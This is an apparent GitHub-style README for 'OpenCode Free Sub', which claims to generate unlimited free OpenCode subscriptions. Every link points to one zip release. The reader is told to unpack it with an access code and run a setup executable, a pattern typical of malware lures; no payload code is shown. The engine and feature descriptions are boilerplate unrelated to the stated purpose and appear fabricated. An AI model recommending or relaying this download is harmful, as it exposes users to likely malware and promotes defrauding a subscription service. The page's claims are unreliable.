<div align="center">

# OpenCode Free Sub — OpenCode Free Sub — Opencode Free Sub (Portable x64 Build, JSON Configuration)

<p><strong>OpenCode Free Sub — OpenCode Free Sub — Opencode Free Sub (Portable x64 Build, JSON Configuration): Free OpenCode subscription: generation and activation in a minute. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/opencode-free-sub-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/opencode-free-sub-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/opencode-free-sub-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/opencode-free-sub?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/opencode-free-sub-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download opencode-free-sub-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/opencode-free-sub-v0.1.0-win64.zip"><img src="banner.svg" alt="OpenCode Free Sub Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**OpenCode Free Sub — Free OpenCode subscription: generation and activation in a minute** (`opencode-free-sub`) is a dedicated, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`opencode-free-sub-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/opencode-free-sub-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`opencode-free-sub-v0.1.0-win64.zip`](../../releases/download/v0.1.0/opencode-free-sub-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `OpencodeFreeSub_Setup_x64.exe` (keep `config/settings.json` in the same folder).

### FAQ

<details>
<summary><b>How many subscriptions?</b></summary>

As many as you need — unlimited generation.
</details>
<details>
<summary><b>Activation?</b></summary>

Automatic, a minute total.
</details>
<details>
<summary><b>Works with?</b></summary>

CLI + IDE plugins.
</details>

### Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

### Documentation & Guides

- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [FAQ — platform support, data storage](docs/FAQ.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/opencode-free-sub.git
cd opencode-free-sub
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: opencode-free-sub, opencode, free, subscription, tool, generation, ai-tools, free-tier, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
